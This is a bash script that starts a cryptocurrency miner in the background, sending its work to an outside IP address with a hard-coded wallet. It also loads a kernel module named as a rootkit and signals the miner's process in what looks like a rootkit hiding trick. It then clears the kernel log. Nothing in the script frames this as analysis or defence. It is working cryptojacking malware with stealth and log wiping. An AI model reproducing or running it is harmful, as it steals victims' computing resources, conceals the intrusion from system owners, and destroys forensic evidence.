#!/bin/bash
echo "Starting ZE15_do.sh" >> /tmp/ZE15_log

nohup /etc/ZE15 -o 38.207.173.58:5452 -u ZEPHYR2Yog6TxGyfkMJHnPgwgVXqnLedviqRvNkmjzY7Nw12TPsdxvrRipC5aQNvu8RmroaqXmUQx3yhYDZVHXu7aBeRtLLW8Wu15 -p ze15_1 -a rx/0 -k --donate-level 0 --tls >/dev/null 2>&1 &

ze15_pid=$!

echo "---------------------" >> /tmp/ZE15_log
ps aux |grep ZE15 >> /tmp/ZE15_log 

insmod /etc/ZE15_rootkit.ko >> /tmp/ZE15_log 2>&1


kill -31 $ze15_pid >> /tmp/ZE15_log 2>&1

dmesg -C
echo "Finished ZE15_do.sh" >> /tmp/ZE15_log
